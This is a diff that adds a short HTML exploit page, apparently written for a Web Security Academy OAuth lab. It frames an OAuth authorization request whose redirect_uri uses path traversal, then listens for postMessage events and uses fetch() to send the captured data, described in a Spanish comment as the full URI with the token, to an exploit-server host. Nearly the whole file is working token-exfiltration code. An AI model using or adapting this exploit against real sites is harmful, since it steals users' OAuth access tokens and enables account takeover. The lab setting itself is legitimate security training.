@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parent Document</title>
+</head>
+<body>
+    <iframe id="myIframe" src="https://oauth-0a90000504231a6d80cb1a8a02a500ed.oauth-server.net/auth?client_id=qelbl9ku6h7unxb9mad1x&redirect_uri=https://0a17004f04221a1380641c74002500cf.web-security-academy.net/oauth-callback/../../../../post/comment/comment-form&response_type=token&nonce=-1934635177&scope=openid%20profile%20email" width="600" height="400"></iframe>
+
+    <script>
+       // Una vez cargue el iframe se dispara la data que seria todo el URI 
+       window.addEventListener('message', function(e){
+            fetch("https://exploit-0ac800ed04981aaf80751bf901e1003f.exploit-server.net/?data=" + encodeURIComponent(e.data.data))
+       }, false)
+    </script>
+</body>
+</html>
